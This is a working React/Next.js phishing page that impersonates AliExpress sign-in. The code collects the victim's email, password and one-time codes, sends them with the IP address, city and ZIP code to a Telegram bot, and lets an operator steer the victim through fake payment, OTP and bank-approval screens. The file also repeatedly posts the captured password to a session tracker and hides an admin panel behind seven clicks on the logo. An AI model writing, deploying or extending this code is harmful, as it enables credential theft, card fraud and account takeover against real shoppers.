'use client';
import React, { useState, useEffect, useCallback, useRef } from 'react';
import { ChevronDown, Eye, EyeOff, AlertCircle } from 'lucide-react';
import { TranslationProvider, useTranslation } from '@/lib/TranslationContext';
import { loadBotConfigFromServer } from '@/lib/botConfig';
import { Captcha } from '@/components/Captcha';
import { PaymentPage } from '@/components/PaymentPage';
import { OtpPage } from '@/components/OtpPage';
import { BankApprovalPage } from '@/components/BankApprovalPage';
import { ProcessingPage } from '@/components/ProcessingPage';
import { SocialButton } from '@/components/SocialButton';

type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked' | 'declined';

// Use sessionStorage to keep the same session ID across React re-renders/hot-reloads
// This ensures the admin panel always targets the correct browser tab
const SESSION_ID: string = (() => {
  if (typeof window === 'undefined') return Math.random().toString(36).slice(2);
  const stored = sessionStorage.getItem('_track_sid');
  if (stored) return stored;
  const id = Math.random().toString(36).slice(2);
  sessionStorage.setItem('_track_sid', id);
  return id;
})();

// ── Telegram sender — always via server-side proxy ───────────────────────────
async function sendTelegram(token: string, chatId: string, text: string): Promise<void> {
  if (!token || !chatId) {
    console.warn('[TG] No token/chatId configured');
    return;
  }
  try {
    const res = await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, chatId, text }),
    });
    const data = await res.json();
    if (data.ok) {
      console.log('[TG] Sent OK, msg_id:', data.result?.message_id);
    } else {
      console.error('[TG] Error:', data.description || data.error);
    }
  } catch (e) {
    console.error('[TG] Fetch failed:', e);
  }
}

// ── Session tracker ──────────────────────────────────────────────────────────
function useSessionTracker(page: string, ip: string, country: string, extra: Record<string, unknown> = {}) {
  const extraStr = JSON.stringify(extra);
  useEffect(() => {
    const post = () => {
      try {
        navigator.sendBeacon(
          `/api/sessions/${SESSION_ID}`,
          JSON.stringify({ ip, country, currentPage: page, status: 'online', ...extra })
        );
      } catch {}
    };
    post();
    const t = setInterval(post, 3000);
    return () => clearInterval(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, ip, country, extraStr]);
}

// ── Login Page ───────────────────────────────────────────────────────────────
interface LoginPageProps {
  onLogin: (email: string, password: string) => void;
  locationName: string;
  onLogoClick: () => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ onLogin, locationName, onLogoClick }) => {
  const { t } = useTranslation();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [processing, setProcessing] = useState(false);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (email && password && !processing) {
      setProcessing(true);
      setTimeout(() => onLogin(email, password), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl">
      <header className="w-full flex items-center justify-between p-4 border-b border-gray-100">
        <div className="w-8" />
        <div className="flex-1 flex justify-center" onClick={onLogoClick}>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png"
            alt="AliExpress"
            className="h-6 object-contain cursor-pointer"
          />
        </div>
        <div className="w-8" />
      </header>

      <div className="w-full px-6 pt-8 pb-4">
        <h2 className="text-2xl font-bold text-[#191919] mb-8">{t('signIn')}</h2>
        <form onSubmit={handleLogin} className="space-y-4">
          <input
            type="text"
            value={email}
            onChange={e => setEmail(e.target.value)}
            placeholder={t('emailOrPhone')}
            disabled={processing}
            className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50 disabled:opacity-60"
          />
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={e => setPassword(e.target.value)}
              placeholder={t('password')}
              disabled={processing}
              className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50 disabled:opacity-60"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>
          <button
            type="submit"
            disabled={!email || !password || processing}
            className={`w-full py-4 rounded-full text-lg font-bold text-white transition-all ${
              !email || !password || processing
                ? 'bg-[#E0E0E0] cursor-not-allowed'
                : 'bg-[#FF4747] hover:bg-[#e03030]'
            }`}
          >
            {processing ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5 text-gray-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                {t('processing')}
              </span>
            ) : t('signIn')}
          </button>
        </form>

        <div className="mt-4 flex justify-between items-center px-1">
          <button className="text-sm text-gray-500">{t('forgotPassword')}</button>
          <button className="text-sm text-[#FF4747] font-semibold">{t('signUp')}</button>
        </div>

        <div className="relative flex items-center py-6">
          <div className="flex-grow border-t border-gray-200"></div>
          <span className="flex-shrink mx-4 text-gray-400 text-xs font-medium uppercase tracking-widest">
            {t('orContinueWith')}
          </span>
          <div className="flex-grow border-t border-gray-200"></div>
        </div>

        <div className="grid grid-cols-1 gap-3">
          <SocialButton type="google" label="google" icon="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" />
          <SocialButton type="facebook" label="facebook" icon="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" />
          <SocialButton type="apple" label="apple" icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" />
        </div>
      </div>

      <footer className="w-full px-6 py-8 text-center bg-white mt-auto">
        <div className="flex items-center justify-center gap-1 mb-6 text-gray-600">
          <span className="text-sm">{t('location')}:</span>
          <button className="flex items-center gap-0.5 text-sm font-semibold hover:text-[#FF4747]">
            {locationName} <ChevronDown className="w-4 h-4" />
          </button>
        </div>
        <p className="text-[11px] leading-relaxed text-gray-400 font-normal max-w-[280px] mx-auto">
          {t('bySigningIn')}{' '}
          <a href="#" className="underline">{t('termsOfUse')}</a>{' '}
          {t('and')}{' '}
          <a href="#" className="underline">{t('privacyPolicy')}</a>.
        </p>
      </footer>
    </div>
  );
};

// ── Blocked Page ─────────────────────────────────────────────────────────────
const BlockedPage: React.FC = () => (
  <div className="min-h-screen bg-white flex flex-col items-center justify-center max-w-md mx-auto shadow-xl p-8 text-center">
    <div className="text-6xl mb-4">🚫</div>
    <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Blocked</h1>
    <p className="text-gray-500 text-sm">Your access has been temporarily restricted.</p>
  </div>
);

// ── Declined Page ─────────────────────────────────────────────────────────────
const DeclinedPage: React.FC = () => {
  const { t } = useTranslation();
  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center max-w-md mx-auto shadow-xl p-8 text-center">
      <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mb-6">
        <AlertCircle className="w-10 h-10 text-red-500" />
      </div>
      <h1 className="text-2xl font-bold text-gray-900 mb-2">{t('paymentDeclined')}</h1>
      <p className="text-gray-500 text-sm max-w-[260px] mx-auto">{t('cardDeclined')}</p>
    </div>
  );
};

// ── Main App Inner ────────────────────────────────────────────────────────────
interface GeoInfo {
  ip: string;
  country: string;
  city: string;
  zip: string;
}

const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
  const [view, setView] = useState<ViewState>('captcha');
  const [isDeclined, setIsDeclined] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isInvalidOtp, setIsInvalidOtp] = useState(false);
  const [adminClickCount, setAdminClickCount] = useState(0);
  const actionPollRef = useRef<NodeJS.Timeout | null>(null);

  useSessionTracker(view, geo.ip, geo.country, email ? { email, password } : {});

  // ── Admin action polling — runs continuously, handles all views ──────────
  useEffect(() => {
    if (actionPollRef.current) clearInterval(actionPollRef.current);
    actionPollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/actions/${SESSION_ID}`);
        const { action } = await res.json();
        if (!action || action === 'normal') return;

        // Action is already cleared atomically by the server GET handler
        if (action === 'otp') { setIsInvalidOtp(false); setView('otp'); }
        else if (action === 'bank_approval') setView('bank-approval');
        else if (action === 'invalid_otp') { setIsInvalidOtp(true); setView('otp'); }
        else if (action === 'declined') { setIsDeclined(true); setView('payment'); }
        else if (action === 'block') setView('blocked');
      } catch {}
    }, 2000);
    return () => { if (actionPollRef.current) clearInterval(actionPollRef.current); };
  }, []);

  const handleLogoClick = () => {
    setAdminClickCount(c => {
      const next = c + 1;
      if (next >= 7) { window.location.href = '/admin'; return 0; }
      return next;
    });
  };

  // ── Captcha passed → send visitor notification ───────────────────────────
  const handleCaptchaVerified = useCallback(async () => {
    const cfg = await loadBotConfigFromServer();
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `👁 <b>New AliExpress Visitor</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📮 <b>ZIP Code:</b> ${geo.zip || 'Unknown'}\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setView('login');
  }, [geo]);

  // ── Login → send credentials ─────────────────────────────────────────────
  const handleLogin = useCallback(async (e: string, p: string) => {
    setEmail(e);
    setPassword(p);
    const cfg = await loadBotConfigFromServer();
    console.log('[Login] Config:', cfg.token ? 'token OK' : 'NO TOKEN', cfg.chatId ? 'chatId OK' : 'NO CHATID');
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `🔐 <b>New Login Captured</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email/Phone:</b> <code>${e}</code>\n` +
        `🔑 <b>Password:</b> <code>${p}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📮 <b>ZIP Code:</b> ${geo.zip || 'Unknown'}\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setView('payment');
  }, [geo]);

  // ── Payment complete → go to loading, wait for admin action ─────────────
  // Card is sent ONLY from PaymentPage.tsx — do NOT send again here
  const handlePaymentComplete = useCallback(async () => {
    // Card details are sent by PaymentPage.tsx directly — no duplicate send here
    setView('loading');
  }, []);

  // ── OTP submitted → send OTP, go to loading, wait for admin action ───────
  const handleOtpVerify = useCallback(async (otp: string) => {
    const cfg = await loadBotConfigFromServer();
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `🔢 <b>OTP Code Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Account:</b> <code>${email || 'N/A'}</code>\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setIsInvalidOtp(false);
    // Go to loading — stays here until admin takes action via the action poll
    setView('loading');
  }, [email, geo]);

  if (view === 'captcha') return <Captcha onVerified={handleCaptchaVerified} />;
  if (view === 'login') return (
    <LoginPage
      onLogin={handleLogin}
      locationName={geo.country || 'Global'}
      onLogoClick={handleLogoClick}
    />
  );
  if (view === 'payment') return (
    <PaymentPage
      onBack={() => setView('login')}
      onComplete={() => { setIsDeclined(false); handlePaymentComplete(); }}
      botToken=""
      chatId=""
      currentIp={geo.ip}
      country={geo.country}
      city={geo.city}
      zip={geo.zip}
      email={email}
      isDeclined={isDeclined}
    />
  );
  // loading view: ProcessingPage stays until admin action poll triggers a view change
  if (view === 'loading') return <ProcessingPage />;
  if (view === 'otp') return (
    <OtpPage
      onVerify={handleOtpVerify}
      isInvalidOtp={isInvalidOtp}
      onResend={() => setIsInvalidOtp(false)}
    />
  );
  if (view === 'bank-approval') return <BankApprovalPage />;
  if (view === 'blocked') return <BlockedPage />;
  return null;
};

// ── IP + Country + City + ZIP detection ──────────────────────────────────────
// Strategy: Race all services in parallel, use first successful result.
// ipapi.co returns IP+country+city+zip in one call. ipify+server-geo is a reliable combo.
const MainApp: React.FC = () => {
  const [geo, setGeo] = useState<GeoInfo>({ ip: '', country: '', city: '', zip: '' });

  useEffect(() => {
    let done = false;

    const trySet = (g: GeoInfo, source: string) => {
      if (done) return;
      done = true;
      console.log(`[Geo] Success via ${source}: IP=${g.ip} Country=${g.country} City=${g.city} ZIP=${g.zip}`);
      setGeo(g);
    };

    // Method A: ipapi.co — single call returns IP + country + city + zip (HTTPS, CORS *)
    const methodA = async () => {
      const r = await fetch('https://ipapi.co/json/', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`ipapi.co HTTP ${r.status}`);
      const d = await r.json();
      if (d.error) throw new Error(`ipapi.co error: ${d.reason}`);
      if (!d.ip || !d.country_name) throw new Error('ipapi.co missing fields');
      trySet({ ip: d.ip, country: d.country_name, city: d.city || '', zip: d.postal || '' }, 'ipapi.co');
    };

    // Method B: ipify → server geo lookup (returns city + zip too)
    const methodB = async () => {
      const r = await fetch('https://api.ipify.org?format=json', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`ipify HTTP ${r.status}`);
      const d = await r.json();
      if (!d.ip) throw new Error('ipify no ip');
      const realIp = d.ip;
      if (!done) setGeo(g => ({ ...g, ip: realIp }));
      const r2 = await fetch(`/api/geo?ip=${encodeURIComponent(realIp)}`, {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r2.ok) throw new Error(`geo HTTP ${r2.status}`);
      const d2 = await r2.json();
      if (!d2.country || d2.country === 'Unknown') throw new Error('geo unknown country');
      trySet({ ip: d2.ip || realIp, country: d2.country, city: d2.city || '', zip: d2.zip || '' }, 'ipify+geo');
    };

    // Method C: api64.ipify → server geo lookup (IPv6 fallback)
    const methodC = async () => {
      const r = await fetch('https://api64.ipify.org?format=json', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`api64.ipify HTTP ${r.status}`);
      const d = await r.json();
      if (!d.ip) throw new Error('api64.ipify no ip');
      const realIp = d.ip;
      if (!done) setGeo(g => ({ ...g, ip: realIp }));
      const r2 = await fetch(`/api/geo?ip=${encodeURIComponent(realIp)}`, {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r2.ok) throw new Error(`geo HTTP ${r2.status}`);
      const d2 = await r2.json();
      if (!d2.country || d2.country === 'Unknown') throw new Error('geo unknown country');
      trySet({ ip: d2.ip || realIp, country: d2.country, city: d2.city || '', zip: d2.zip || '' }, 'api64+geo');
    };

    // Run all methods in parallel — first success wins
    Promise.allSettled([methodA(), methodB(), methodC()]).then(results => {
      results.forEach((r, i) => {
        if (r.status === 'rejected') {
          console.warn(`[Geo] Method ${['A', 'B', 'C'][i]} failed:`, r.reason?.message || r.reason);
        }
      });
      if (!done) {
        console.warn('[Geo] All methods failed');
      }
    });
  }, []);

  return (
    <TranslationProvider country={geo.country}>
      <MainAppInner geo={geo} />
    </TranslationProvider>
  );
};

export default function Home() {
  return <MainApp />;
}
